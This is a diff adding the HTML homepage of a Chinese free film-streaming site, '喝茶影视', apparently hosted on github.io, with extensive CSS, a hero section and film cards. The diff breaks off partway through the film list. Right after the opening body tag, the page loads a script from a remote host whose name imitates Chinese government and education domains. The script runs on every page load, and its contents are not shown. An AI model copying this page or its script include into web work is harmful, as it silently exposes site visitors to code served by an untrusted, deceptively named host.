@@ -1,0 +1,1401 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="喝茶影视 - 免费高清在线观看最新电影、电视剧、动漫、综艺节目。喝茶影视网提供海量正版高清影视资源，每日更新热门影视内容，多端畅看，品味影视如品茶。">
+<meta name="keywords" content="喝茶影视, hechayingshi-wap, 免费影视, 在线观看, 高清电影, 电视剧, 动漫, 综艺, 喝茶影视网">
+<meta name="robots" content="index, follow">
+<meta name="format-detection" content="telephone=no">
+<meta property="og:title" content="喝茶影视 - 免费高清在线观看电影电视剧">
+<meta property="og:description" content="喝茶影视网提供海量正版高清影视资源，每日更新，多端畅看，品味影视如品茶。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://hechayingshi-wap.github.io">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="theme-color" content="#1a1208">
+<title>喝茶影视 - 免费高清在线观看最新电影电视剧动漫综艺 | 喝茶影视网</title>
+<style>
+/* ============================================
+   THEME TOKENS — Tea Gold Aesthetic
+   ============================================ */
+:root{
+  --tea-green:#4a7c59;
+  --tea-green-light:#7cb342;
+  --tea-gold:#c9a961;
+  --tea-gold-light:#e8d5a3;
+  --tea-amber:#d4a574;
+  --tea-brown:#5d4037;
+  --bg-base:#1a1208;
+  --bg-warm:#221811;
+  --bg-card:#2a1f14;
+  --bg-card-hover:#332519;
+  --text-primary:#f5edd6;
+  --text-secondary:#b8a88c;
+  --text-muted:#8a7a5e;
+  --border-soft:rgba(201,169,97,0.15);
+  --border-glow:rgba(201,169,97,0.35);
+  --gradient-hero:linear-gradient(160deg,#1a1208 0%,#221811 40%,#2a1f14 100%);
+  --gradient-tea:linear-gradient(135deg,#4a7c59,#7cb342);
+  --gradient-gold:linear-gradient(135deg,#c9a961,#e8d5a3);
+  --gradient-warm:linear-gradient(135deg,#d4a574,#c9a961);
+  --shadow-tea:0 8px 32px rgba(74,124,89,0.2);
+  --shadow-gold:0 8px 32px rgba(201,169,97,0.2);
+  --radius:14px;
+  --radius-sm:8px;
+  --transition:all 0.35s cubic-bezier(0.25,0.46,0.45,0.94);
+}
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth;font-size:16px}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif;
+  background:var(--bg-base);
+  color:var(--text-primary);
+  line-height:1.7;
+  overflow-x:hidden;
+}
+img{max-width:100%;height:auto;display:block}
+a{text-decoration:none;color:inherit}
+ul,ol{list-style:none}
+button{font-family:inherit;border:none;cursor:pointer;background:none;color:inherit}
+::-webkit-scrollbar{width:6px;height:6px}
+::-webkit-scrollbar-track{background:var(--bg-base)}
+::-webkit-scrollbar-thumb{background:var(--tea-brown);border-radius:3px}
+
+/* ============================================
+   PRELOADER
+   ============================================ */
+.preloader{
+  position:fixed;inset:0;z-index:9999;
+  background:var(--bg-base);
+  display:flex;align-items:center;justify-content:center;
+  flex-direction:column;gap:20px;
+  transition:opacity 0.6s ease,visibility 0.6s ease;
+}
+.preloader.hidden{opacity:0;visibility:hidden}
+.preloader-steam{
+  font-size:4rem;
+  animation:breathe 2s ease-in-out infinite;
+}
+@keyframes breathe{0%,100%{opacity:0.5;transform:scale(1)}50%{opacity:1;transform:scale(1.1)}}
+.preloader-text{
+  font-size:1.2rem;color:var(--tea-gold);
+  letter-spacing:4px;
+  animation:letterSpacing 1.5s ease-in-out infinite alternate;
+}
+@keyframes letterSpacing{from{letter-spacing:4px}to{letter-spacing:8px}}
+
+/* ============================================
+   NAVIGATION — Glassmorphism
+   ============================================ */
+.nav{
+  position:fixed;top:0;left:0;right:0;z-index:1000;
+  background:rgba(26,18,8,0.85);
+  backdrop-filter:blur(16px);
+  -webkit-backdrop-filter:blur(16px);
+  border-bottom:1px solid var(--border-soft);
+  transition:var(--transition);
+}
+.nav-inner{
+  max-width:1440px;margin:0 auto;padding:0 24px;
+  display:flex;align-items:center;justify-content:space-between;
+  height:68px;
+}
+.nav-brand{
+  display:flex;align-items:center;gap:10px;
+  font-size:1.4rem;font-weight:800;
+  color:var(--tea-gold);
+}
+.nav-brand-icon{font-size:1.8rem;animation:float-tea 3s ease-in-out infinite}
+@keyframes float-tea{0%,100%{transform:translateY(0) rotate(-5deg)}50%{transform:translateY(-4px) rotate(5deg)}}
+.nav-links{display:flex;gap:4px;align-items:center}
+.nav-links a{
+  padding:8px 18px;border-radius:var(--radius-sm);
+  font-size:0.88rem;font-weight:500;
+  color:var(--text-secondary);
+  transition:var(--transition);
+  position:relative;
+}
+.nav-links a:hover{
+  color:var(--tea-gold-light);
+  background:rgba(201,169,97,0.08);
+}
+.nav-links a::after{
+  content:'';position:absolute;
+  bottom:2px;left:50%;width:0;height:2px;
+  background:var(--gradient-gold);
+  transition:all 0.3s ease;
+  transform:translateX(-50%);
+  border-radius:2px;
+}
+.nav-links a:hover::after{width:60%}
+.nav-actions{display:flex;align-items:center;gap:12px}
+.nav-btn{
+  width:38px;height:38px;border-radius:50%;
+  display:flex;align-items:center;justify-content:center;
+  background:rgba(201,169,97,0.1);
+  border:1px solid var(--border-soft);
+  transition:var(--transition);
+  font-size:0.9rem;
+}
+.nav-btn:hover{background:var(--tea-gold);transform:scale(1.1)}
+.nav-toggle{display:none;flex-direction:column;gap:5px;padding:8px;width:40px}
+.nav-toggle span{width:22px;height:2px;background:var(--tea-gold);border-radius:2px;transition:var(--transition)}
+
+/* ============================================
+   HERO — Tea Ceremony Inspired
+   ============================================ */
+.hero{
+  min-height:100vh;
+  display:flex;align-items:center;
+  position:relative;
+  background:var(--gradient-hero);
+  padding-top:68px;
+  overflow:hidden;
+}
+.hero-steam{
+  position:absolute;inset:0;overflow:hidden;
+}
+.steam-particle{
+  position:absolute;bottom:-100px;
+  width:60px;height:60px;
+  border-radius:50%;
+  background:radial-gradient(circle,rgba(201,169,97,0.06),transparent 70%);
+  animation:steam-rise linear infinite;
+}
+.steam-particle:nth-child(1){left:10%;width:80px;height:80px;animation-duration:8s;animation-delay:0s}
+.steam-particle:nth-child(2){left:25%;width:50px;height:50px;animation-duration:6s;animation-delay:2s}
+.steam-particle:nth-child(3){left:45%;width:100px;height:100px;animation-duration:10s;animation-delay:1s}
+.steam-particle:nth-child(4){left:65%;width:60px;height:60px;animation-duration:7s;animation-delay:3s}
+.steam-particle:nth-child(5){left:80%;width:70px;height:70px;animation-duration:9s;animation-delay:0.5s}
+.steam-particle:nth-child(6){left:90%;width:45px;height:45px;animation-duration:5.5s;animation-delay:4s}
+@keyframes steam-rise{
+  0%{transform:translateY(0) scale(1);opacity:0}
+  10%{opacity:0.6}
+  90%{opacity:0.1}
+  100%{transform:translateY(-120vh) scale(2.5);opacity:0}
+}
+.hero-inner{
+  position:relative;z-index:2;
+  max-width:1440px;margin:0 auto;padding:0 24px;
+  width:100%;
+  display:grid;
+  grid-template-columns:1.2fr 1fr;
+  gap:60px;align-items:center;
+}
+.hero-content{text-align:left}
+.hero-badge-row{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:24px}
+.hero-badge{
+  display:inline-flex;align-items:center;gap:6px;
+  padding:6px 16px;border-radius:30px;
+  font-size:0.8rem;font-weight:500;
+  background:rgba(74,124,89,0.15);
+  border:1px solid rgba(74,124,89,0.3);
+  color:var(--tea-green-light);
+}
+.hero-badge.gold{
+  background:rgba(201,169,97,0.12);
+  border-color:var(--border-glow);
+  color:var(--tea-gold);
+}
+.hero h1{
+  font-size:clamp(2.2rem,5vw,4.5rem);
+  font-weight:900;
+  line-height:1.1;
+  margin-bottom:20px;
+  letter-spacing:-1px;
+}
+.hero h1 .highlight{
+  background:var(--gradient-gold);
+  -webkit-background-clip:text;background-clip:text;
+  -webkit-text-fill-color:transparent;
+}
+.hero-sub{
+  font-size:clamp(1rem,1.5vw,1.2rem);
+  color:var(--text-secondary);
+  max-width:520px;margin-bottom:36px;
+  line-height:1.8;
+}
+.hero-metrics{
+  display:flex;gap:40px;flex-wrap:wrap;
+  margin-bottom:36px;
+  padding:24px 0;
+  border-top:1px solid var(--border-soft);
+  border-bottom:1px solid var(--border-soft);
+}
+.hero-metric{}
+.hero-metric-val{
+  font-size:2rem;font-weight:900;
+  background:var(--gradient-tea);
+  -webkit-background-clip:text;background-clip:text;
+  -webkit-text-fill-color:transparent;
+}
+.hero-metric-lbl{font-size:0.82rem;color:var(--text-muted);margin-top:2px}
+.hero-cta-row{display:flex;gap:14px;flex-wrap:wrap}
+.btn{
+  display:inline-flex;align-items:center;gap:8px;
+  padding:14px 32px;border-radius:50px;
+  font-size:0.95rem;font-weight:600;
+  transition:var(--transition);
+  cursor:pointer;
+}
+.btn-tea{
+  background:var(--gradient-tea);
+  color:#fff;
+  box-shadow:var(--shadow-tea);
+}
+.btn-tea:hover{transform:translateY(-3px);box-shadow:0 12px 40px rgba(74,124,89,0.4)}
+.btn-gold-outline{
+  border:2px solid var(--border-glow);
+  color:var(--tea-gold-light);
+}
+.btn-gold-outline:hover{border-color:var(--tea-gold);color:var(--tea-gold);background:rgba(201,169,97,0.08);transform:translateY(-3px)}
+
+/* Hero visual — Tea cup */
+.hero-visual{
+  display:flex;justify-content:center;align-items:center;
+  position:relative;
+}
+.tea-cup{
+  width:280px;height:280px;border-radius:50%;
+  background:radial-gradient(circle at 40% 35%,#3a2a1a,#1a1208);
+  border:3px solid var(--border-glow);
+  box-shadow:0 0 80px rgba(201,169,97,0.15),inset 0 0 60px rgba(0,0,0,0.5);
+  display:flex;flex-direction:column;align-items:center;justify-content:center;
+  position:relative;
+  animation:cup-glow 4s ease-in-out infinite;
+}
+@keyframes cup-glow{0%,100%{box-shadow:0 0 80px rgba(201,169,97,0.15),inset 0 0 60px rgba(0,0,0,0.5)}50%{box-shadow:0 0 120px rgba(201,169,97,0.25),inset 0 0 60px rgba(0,0,0,0.5)}}
+.tea-cup-icon{font-size:5rem;margin-bottom:12px}
+.tea-cup-text{
+  font-size:1.1rem;color:var(--tea-gold);
+  letter-spacing:6px;font-weight:700;
+}
+.tea-cup-sub{
+  font-size:0.75rem;color:var(--text-muted);
+  letter-spacing:2px;margin-top:4px;
+}
+.tea-leaf{
+  position:absolute;
+  font-size:1.5rem;
+  opacity:0.3;
+  animation:leaf-fall linear infinite;
+}
+.tea-leaf:nth-child(1){top:10%;left:20%;animation-duration:6s;animation-delay:0s}
+.tea-leaf:nth-child(2){top:30%;right:15%;animation-duration:8s;animation-delay:2s}
+.tea-leaf:nth-child(3){bottom:20%;left:10%;animation-duration:7s;animation-delay:1s}
+.tea-leaf:nth-child(4){bottom:10%;right:25%;animation-duration:9s;animation-delay:3s}
+@keyframes leaf-fall{0%{transform:translateY(-20px) rotate(0deg);opacity:0}20%{opacity:0.3}80%{opacity:0.2}100%{transform:translateY(60px) rotate(180deg);opacity:0}}
+
+/* ============================================
+   SECTION BASE
+   ============================================ */
+.section{padding:90px 0;position:relative}
+.section-inner{max-width:1440px;margin:0 auto;padding:0 24px}
+.sec-head{text-align:center;margin-bottom:60px}
+.sec-kicker{
+  display:inline-block;
+  font-size:0.75rem;letter-spacing:3px;text-transform:uppercase;
+  color:var(--tea-green-light);
+  margin-bottom:10px;font-weight:600;
+}
+.sec-title{
+  font-size:clamp(1.6rem,3.5vw,2.8rem);
+  font-weight:800;color:var(--text-primary);
+  margin-bottom:12px;
+}
+.sec-title em{font-style:normal;color:var(--tea-gold)}
+.sec-desc{
+  font-size:1rem;color:var(--text-secondary);
+  max-width:520px;margin:0 auto;
+}
+
+/* ============================================
+   FILM SECTION — Masonry Card Layout
+   ============================================ */
+.film-section{background:linear-gradient(180deg,var(--bg-base),var(--bg-warm))}
+.film-filter{
+  display:flex;gap:10px;justify-content:center;flex-wrap:wrap;
+  margin-bottom:36px;
+}
+.film-filter button{
+  padding:8px 20px;border-radius:30px;
+  font-size:0.85rem;font-weight:500;
+  background:rgba(255,255,255,0.03);
+  border:1px solid var(--border-soft);
+  color:var(--text-secondary);
+  transition:var(--transition);
+}
+.film-filter button:hover,.film-filter button.active{
+  background:var(--gradient-tea);
+  border-color:transparent;
+  color:#fff;
+}
+.film-masonry{
+  columns:4;
+  column-gap:20px;
+}
+.film-card{
+  break-inside:avoid;
+  margin-bottom:20px;
+  border-radius:var(--radius);
+  overflow:hidden;
+  background:var(--bg-card);
+  border:1px solid var(--border-soft);
+  transition:var(--transition);
+  cursor:pointer;
+  position:relative;
+}
+.film-card:hover{
+  transform:translateY(-6px);
+  border-color:var(--border-glow);
+  box-shadow:var(--shadow-gold);
+}
+.film-cover{
+  position:relative;
+  min-height:220px;
+  display:flex;align-items:center;justify-content:center;
+  background:linear-gradient(145deg,var(--bg-card),var(--bg-card-hover));
+}
+.film-cover-icon{font-size:3.5rem;opacity:0.25}
+.film-cover-badge{
+  position:absolute;top:12px;left:12px;
+  padding:4px 10px;border-radius:var(--radius-sm);
+  font-size:0.7rem;font-weight:700;
+  background:rgba(201,169,97,0.9);
+  color:#1a1208;
+}
+.film-cover-badge.hot{background:linear-gradient(135deg,#e53935,#ff7043)}
+.film-cover-badge.hot{color:#fff}
+.film-cover-badge.new{background:linear-gradient(135deg,#4a7c59,#7cb342);color:#fff}
+.film-cover-score{
+  position:absolute;top:12px;right:12px;
+  width:42px;height:42px;border-radius:50%;
+  display:flex;align-items:center;justify-content:center;
+  font-size:0.8rem;font-weight:800;
+  background:rgba(26,18,8,0.85);
+  border:2px solid var(--tea-gold);
+  color:var(--tea-gold-light);
+}
+.film-body{padding:16px}
+.film-body h3{
+  font-size:1rem;font-weight:700;color:var(--text-primary);
+  margin-bottom:6px;
+  display:flex;align-items:center;justify-content:space-between;gap:8px;
+}
+.film-body h3 span{font-size:0.72rem;color:var(--tea-gold);font-weight:500;flex-shrink:0}
+.film-genre{display:flex;gap:6px;flex-wrap:wrap}
+.film-genre span{
+  font-size:0.72rem;padding:2px 8px;border-radius:4px;
+  background:rgba(74,124,89,0.15);
+  color:var(--tea-green-light);
+}
+
+/* ============================================
+   DRAMA SECTION — Accordion/Tabs Hybrid
+   ============================================ */
+.drama-section{background:linear-gradient(180deg,var(--bg-warm),#1f170e)}
+.drama-tabs{
+  display:flex;gap:4px;
+  background:rgba(255,255,255,0.03);
+  border-radius:var(--radius);
+  padding:6px;
+  margin-bottom:32px;
+  flex-wrap:wrap;
+  border:1px solid var(--border-soft);
+}
+.drama-tab{
+  flex:1;min-width:120px;
+  padding:12px 16px;border-radius:var(--radius-sm);
+  font-size:0.85rem;font-weight:600;
+  color:var(--text-secondary);
+  transition:var(--transition);
+  text-align:center;
+}
+.drama-tab:hover{color:var(--text-primary)}
+.drama-tab.active{
+  background:var(--gradient-warm);
+  color:#1a1208;
+}
+.drama-list{display:flex;flex-direction:column;gap:0}
+.drama-row{
+  display:grid;
+  grid-template-columns:60px 1fr auto auto;
+  gap:20px;align-items:center;
+  padding:16px 20px;
+  border-radius:var(--radius-sm);
+  transition:var(--transition);
+  border-bottom:1px solid rgba(255,255,255,0.04);
+}
+.drama-row:hover{background:rgba(201,169,97,0.06)}
+.drama-rank{
+  width:40px;height:40px;border-radius:10px;
+  display:flex;align-items:center;justify-content:center;
+  font-size:1.1rem;font-weight:900;
+  background:rgba(255,255,255,0.04);
+  color:var(--text-muted);
+}
+.drama-row:nth-child(1) .drama-rank{background:var(--gradient-gold);color:#1a1208}
+.drama-row:nth-child(2) .drama-rank{background:linear-gradient(135deg,#b0bec5,#90a4ae);color:#1a1208}
+.drama-row:nth-child(3) .drama-rank{background:linear-gradient(135deg,#d4a574,#c9a961);color:#1a1208}
+.drama-info h4{font-size:1rem;color:var(--text-primary);margin-bottom:4px;font-weight:600}
+.drama-info p{font-size:0.8rem;color:var(--text-muted)}
+.drama-status{
+  font-size:0.72rem;padding:4px 10px;border-radius:20px;
+  background:rgba(74,124,89,0.15);
+  color:var(--tea-green-light);
+}
+.drama-status.end{background:rgba(201,169,97,0.12);color:var(--tea-gold)}
+.drama-ep{font-size:0.85rem;color:var(--text-secondary);font-weight:600}
+.drama-play{
+  width:36px;height:36px;border-radius:50%;
+  display:flex;align-items:center;justify-content:center;
+  background:rgba(74,124,89,0.2);
+  color:var(--tea-green-light);
+  transition:var(--transition);
+  font-size:0.8rem;
+}
+.drama-play:hover{background:var(--tea-green);color:#fff;transform:scale(1.15)}
+
+/* ============================================
+   ANIME SECTION — Carousel with Overlap
+   ============================================ */
+.anime-section{background:linear-gradient(180deg,#1f170e,#1a1208)}
+.anime-carousel-wrap{position:relative;padding:20px 0}
+.anime-carousel{
+  display:flex;gap:24px;
+  overflow-x:auto;
+  padding:20px 4px;
+  scroll-snap-type:x mandatory;
+  scrollbar-width:none;
+}
+.anime-carousel::-webkit-scrollbar{display:none}
+.anime-card{
+  flex:0 0 300px;
+  scroll-snap-align:center;
+  position:relative;
+  border-radius:var(--radius);
+  overflow:hidden;
+  background:var(--bg-card);
+  border:1px solid var(--border-soft);
+  transition:var(--transition);
+  cursor:pointer;
+}
+.anime-card:hover{transform:scale(1.04);border-color:var(--border-glow);z-index:5}
+.anime-cover{
+  height:200px;
+  display:flex;align-items:center;justify-content:center;
+  font-size:3.5rem;
+  position:relative;
+}
+.anime-cover::before{
+  content:'';position:absolute;inset:0;
+  background:linear-gradient(to top,rgba(26,18,8,0.9),transparent 60%);
+}
+.anime-card-info{padding:20px;position:relative;z-index:2;margin-top:-60px}
+.anime-card-info h3{font-size:1.1rem;color:var(--text-primary);margin-bottom:8px}
+.anime-card-info p{font-size:0.82rem;color:var(--text-muted);margin-bottom:12px}
+.anime-progress{
+  height:4px;border-radius:2px;
+  background:rgba(255,255,255,0.08);
+  overflow:hidden;
+  margin-bottom:8px;
+}
+.anime-progress-bar{
+  height:100%;border-radius:2px;
+  background:var(--gradient-tea);
+}
+.anime-ep-info{font-size:0.75rem;color:var(--tea-green-light)}
+
+/* ============================================
+   VARIETY SECTION — Card Deck (Overlapping)
+   ============================================ */
+.variety-section{background:linear-gradient(180deg,#1a1208,var(--bg-warm))}
+.variety-deck{
+  display:grid;
+  grid-template-columns:repeat(auto-fit,minmax(300px,1fr));
+  gap:24px;
+  perspective:1000px;
+}
+.variety-card{
+  position:relative;
+  border-radius:var(--radius);
+  overflow:hidden;
+  background:var(--bg-card);
+  border:1px solid var(--border-soft);
+  transition:var(--transition);
+  cursor:pointer;
+}
+.variety-card:hover{transform:translateY(-8px) rotateX(2deg);box-shadow:var(--shadow-gold)}
+.variety-card-cover{
+  height:160px;
+  display:flex;align-items:center;justify-content:center;
+  font-size:3rem;
+  position:relative;
+}
+.variety-card-cover::after{
+  content:'';position:absolute;inset:0;
+  background:linear-gradient(to bottom,rgba(26,18,8,0.1),rgba(26,18,8,0.8));
+}
+.variety-card-body{padding:20px}
+.variety-card-body h3{font-size:1.15rem;color:var(--text-primary);margin-bottom:6px}
+.variety-card-body p{font-size:0.85rem;color:var(--text-secondary);margin-bottom:14px}
+.variety-meta{
+  display:flex;justify-content:space-between;align-items:center;
+  padding-top:12px;border-top:1px solid var(--border-soft);
+}
+.variety-day{
+  font-size:0.75rem;color:var(--tea-gold);
+  font-weight:600;
+}
+.variety-type{
+  font-size:0.7rem;padding:3px 10px;border-radius:12px;
+  background:rgba(74,124,89,0.15);
+  color:var(--tea-green-light);
+}
+
+/* ============================================
+   ABOUT / FEATURES — Tea Process Steps
+   ============================================ */
+.features-section{background:linear-gradient(180deg,var(--bg-warm),#1f170e)}
+.tea-process{
+  display:flex;
+  justify-content:space-between;
+  align-items:flex-start;
+  gap:16px;
+  flex-wrap:wrap;
+}
+.tea-step{
+  flex:1;min-width:180px;
+  text-align:center;
+  position:relative;
+  padding:0 12px;
+}
+.tea-step:not(:last-child)::after{
+  content:'→';
+  position:absolute;
+  right:-12px;top:40px;
+  font-size:1.5rem;color:var(--tea-gold);
+  opacity:0.4;
+}
+.tea-step-icon{
+  width:80px;height:80px;margin:0 auto 16px;
+  border-radius:24px;
+  display:flex;align-items:center;justify-content:center;
+  font-size:2rem;
+  background:var(--bg-card);
+  border:2px solid var(--border-glow);
+  transition:var(--transition);
+}
+.tea-step:hover .tea-step-icon{
+  transform:rotate(10deg) scale(1.1);
+  border-color:var(--tea-green);
+  box-shadow:var(--shadow-tea);
+}
+.tea-step h4{font-size:1.05rem;color:var(--text-primary);margin-bottom:6px}
+.tea-step p{font-size:0.82rem;color:var(--text-muted)}
+
+/* ============================================
+   CTA — Tea Invitation
+   ============================================ */
+.cta-section{
+  padding:100px 0;
+  text-align:center;
+  background:var(--gradient-hero);
+  position:relative;
+  overflow:hidden;
+}
+.cta-section::before{
+  content:'';position:absolute;inset:0;
+  background:radial-gradient(ellipse at 50% 50%,rgba(74,124,89,0.1),transparent 60%);
+}
+.cta-inner{position:relative;z-index:2;max-width:560px;margin:0 auto;padding:0 24px}
+.cta-inner h2{
+  font-size:clamp(1.8rem,4vw,3rem);
+  font-weight:900;color:var(--text-primary);margin-bottom:16px;
+}
+.cta-inner h2 span{color:var(--tea-gold)}
+.cta-inner p{font-size:1.05rem;color:var(--text-secondary);margin-bottom:36px}
+.cta-search{
+  display:flex;gap:10px;max-width:440px;margin:0 auto;flex-wrap:wrap;
+}
+.cta-search input{
+  flex:1;min-width:200px;
+  padding:14px 22px;border-radius:50px;
+  border:2px solid var(--border-soft);
+  background:rgba(255,255,255,0.04);
+  color:var(--text-primary);
+  font-size:1rem;outline:none;
+  transition:var(--transition);
+}
+.cta-search input:focus{border-color:var(--tea-green);background:rgba(74,124,89,0.08)}
+.cta-search input::placeholder{color:var(--text-muted)}
+
+/* ============================================
+   FOOTER
+   ============================================ */
+.footer{
+  padding:60px 0 24px;
+  background:#140d05;
+  border-top:1px solid var(--border-soft);
+}
+.footer-inner{max-width:1440px;margin:0 auto;padding:0 24px}
+.footer-grid{
+  display:grid;
+  grid-template-columns:2.5fr 1fr 1fr 1fr;
+  gap:40px;
+  margin-bottom:36px;
+}
+.footer-brand .nav-brand{margin-bottom:12px}
+.footer-brand p{font-size:0.88rem;color:var(--text-muted);max-width:320px;line-height:1.8}
+.footer-col h4{font-size:0.95rem;color:var(--tea-gold);margin-bottom:14px;font-weight:600}
+.footer-col ul{display:flex;flex-direction:column;gap:8px}
+.footer-col a{font-size:0.85rem;color:var(--text-secondary);transition:var(--transition)}
+.footer-col a:hover{color:var(--tea-gold-light);padding-left:4px}
+.footer-bottom{
+  padding-top:24px;
+  border-top:1px solid var(--border-soft);
+  display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:12px;
+}
+.footer-bottom p{font-size:0.78rem;color:var(--text-muted)}
+.footer-social{display:flex;gap:10px}
+.footer-social a{
+  width:34px;height:34px;border-radius:50%;
+  display:flex;align-items:center;justify-content:center;
+  background:rgba(255,255,255,0.04);
+  border:1px solid var(--border-soft);
+  font-size:0.85rem;
+  transition:var(--transition);
+}
+.footer-social a:hover{border-color:var(--tea-gold);transform:translateY(-2px)}
+
+/* ============================================
+   TOAST
+   ============================================ */
+.toast{
+  position:fixed;bottom:24px;left:50%;
+  transform:translateX(-50%) translateY(80px);
+  padding:12px 26px;border-radius:50px;
+  background:rgba(42,31,20,0.96);
+  border:1px solid var(--border-glow);
+  color:var(--tea-gold-light);
+  font-size:0.88rem;
+  z-index:2000;
+  transition:transform 0.4s cubic-bezier(0.175,0.885,0.32,1.275);
+  backdrop-filter:blur(10px);
+  box-shadow:var(--shadow-gold);
+}
+.toast.show{transform:translateX(-50%) translateY(0)}
+
+/* ============================================
+   RESPONSIVE
+   ============================================ */
+@media(max-width:1024px){
+  .hero-inner{grid-template-columns:1fr;gap:40px;text-align:center}
+  .hero-content{text-align:center;display:flex;flex-direction:column;align-items:center}
+  .hero-visual{display:none}
+  .film-masonry{columns:3}
+  .footer-grid{grid-template-columns:1fr 1fr}
+  .tea-step:not(:last-child)::after{display:none}
+  .tea-process{gap:24px}
+}
+@media(max-width:768px){
+  .nav-links{
+    position:fixed;top:68px;left:0;right:0;
+    flex-direction:column;
+    background:rgba(26,18,8,0.98);
+    backdrop-filter:blur(16px);
+    padding:20px;
+    border-bottom:1px solid var(--border-soft);
+    transform:translateY(-200%);
+    transition:transform 0.4s ease;
+    gap:4px;
+  }
+  .nav-links.open{transform:translateY(0)}
+  .nav-links a{padding:14px;width:100%;text-align:center;font-size:1rem}
+  .nav-toggle{display:flex}
+  .film-masonry{columns:2;column-gap:12px}
+  .film-card{margin-bottom:12px}
+  .drama-row{grid-template-columns:44px 1fr auto;gap:12px}
+  .drama-ep,.drama-status{display:none}
+  .section{padding:60px 0}
+  .hero-metrics{gap:24px}
+  .anime-card{flex:0 0 260px}
+  .variety-deck{grid-template-columns:1fr}
+  .footer-grid{grid-template-columns:1fr}
+}
+@media(max-width:480px){
+  .hero h1{font-size:2rem}
+  .film-masonry{columns:2}
+  .film-cover{min-height:160px}
+  .btn{padding:12px 24px;font-size:0.88rem}
+  .hero-metrics{gap:16px}
+  .hero-metric-val{font-size:1.5rem}
+  .tea-step{flex-basis:50%}
+}
+
+/* ============================================
+   SCROLL REVEAL
+   ============================================ */
+.reveal{opacity:0;transform:translateY(30px);transition:opacity 0.7s ease,transform 0.7s ease}
+.reveal.in{opacity:1;transform:translateY(0)}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<!-- Preloader -->
+<div class="preloader" id="preloader">
+  <div class="preloader-steam">🍵</div>
+  <div class="preloader-text">喝茶影视</div>
+</div>
+
+<!-- Navigation -->
+<nav class="nav" id="nav">
+  <div class="nav-inner">
+    <a href="#" class="nav-brand">
+      <span class="nav-brand-icon">🍵</span>
+      喝茶影视
+    </a>
+    <div class="nav-links" id="navLinks">
+      <a href="#home">首页</a>
+      <a href="#film">电影</a>
+      <a href="#drama">电视剧</a>
+      <a href="#anime">动漫</a>
+      <a href="#variety">综艺</a>
+      <a href="#features">关于</a>
+    </div>
+    <div class="nav-actions">
+      <a href="#" class="nav-btn" aria-label="搜索">🔍</a>
+      <button class="nav-toggle" id="navToggle" aria-label="菜单">
+        <span></span><span></span><span></span>
+      </button>
+    </div>
+  </div>
+</nav>
+
+<!-- Hero -->
+<section class="hero" id="home">
+  <div class="hero-steam">
+    <div class="steam-particle"></div>
+    <div class="steam-particle"></div>
+    <div class="steam-particle"></div>
+    <div class="steam-particle"></div>
+    <div class="steam-particle"></div>
+    <div class="steam-particle"></div>
+  </div>
+  <div class="hero-inner">
+    <div class="hero-content">
+      <div class="hero-badge-row">
+        <span class="hero-badge">🍃 每日更新</span>
+        <span class="hero-badge gold">⭐ 高清4K</span>
+        <span class="hero-badge">📱 多端畅看</span>
+      </div>
+      <h1>品味影视<br>如品<span class="highlight">好茶</span></h1>
+      <p class="hero-sub">喝茶影视提供海量高清影视资源，涵盖电影、电视剧、动漫、综艺全品类。慢品每一帧光影，感受每一段故事的温度。</p>
+      <div class="hero-metrics">
+        <div class="hero-metric"><div class="hero-metric-val">12000+</div><div class="hero-metric-lbl">影视资源</div></div>
+        <div class="hero-metric"><div class="hero-metric-val">4K</div><div class="hero-metric-lbl">超清画质</div></div>
+        <div class="hero-metric"><div class="hero-metric-val">365</div><div class="hero-metric-lbl">全年更新</div></div>
+        <div class="hero-metric"><div class="hero-metric-val">0</div><div class="hero-metric-lbl">广告打扰</div></div>
+      </div>
+      <div class="hero-cta-row">
+        <a href="#film" class="btn btn-tea">🍵 开始品鉴</a>
+        <a href="#features" class="btn btn-gold-outline">了解更多</a>
+      </div>
+    </div>
+    <div class="hero-visual">
+      <div class="tea-cup">
+        <div class="tea-leaf">🍃</div>
+        <div class="tea-leaf">🌿</div>
+        <div class="tea-leaf">🍃</div>
+        <div class="tea-leaf">🌿</div>
+        <div class="tea-cup-icon">🎬</div>
+        <div class="tea-cup-text">喝茶影视</div>
+        <div class="tea-cup-sub">HECHA YINGSHI</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Film Section -->
+<section class="section film-section" id="film">
+  <div class="section-inner">
+    <div class="sec-head">
+      <span class="sec-kicker">FILM</span>
+      <h2 class="sec-title">精选<em>电影</em>馆</h2>
+      <p class="sec-desc">院线大片、经典佳作、独立电影，4K超清在线品鉴</p>
+    </div>
+    <div class="film-filter">
+      <button class="active">全部</button>
+      <button>动作</button>
+      <button>爱情</button>
+      <button>科幻</button>
+      <button>悬疑</button>
+      <button>喜剧</button>
+      <button>动画</button>
+    </div>
+    <div class="film-masonry">
+      <article class="film-card">
+        <div class="film-cover" style="min-height:300px">
+          <div class="film-cover-icon">🌌</div>
+          <span class="film-cover-badge hot">HOT</span>
+          <span class="film-cover-score">9.3</span>
+        </div>
+        <div class="film-body">
+          <h3>银河回响 <span>2026</span></h3>
+          <div class="film-genre"><span>科幻</span><span>冒险</span><span>IMAX</span></div>
+        </div>
+      </article>
+      <article class="film-card">
+        <div class="film-cover" style="min-height:220px">
+          <div class="film-cover-icon">💝</div>
+          <span class="film-cover-badge new">NEW</span>
+          <span class="film-cover-score">8.7</span>
+        </div>
+        <div class="film-body">
+          <h3>秋日情书 <span>2026</span></h3>
+          <div class="film-genre"><span>爱情</span><span>治愈</span></div>
+        </div>
+      </article>
+      <article class="film-card">
+        <div class="film-cover" style="min-height:260px">
+          <div class="film-cover-icon">⚔️</div>
+          <span class="film-cover-score">9.0</span>
+        </div>
+        <div class="film-body">
+          <h3>剑啸江湖 <span>2025</span></h3>
+          <div class="film-genre"><span>武侠</span><span>动作</span><span>古装</span></div>
+        </div>
+      </article>
+      <article class="film-card">
+        <div class="film-cover" style="min-height:200px">
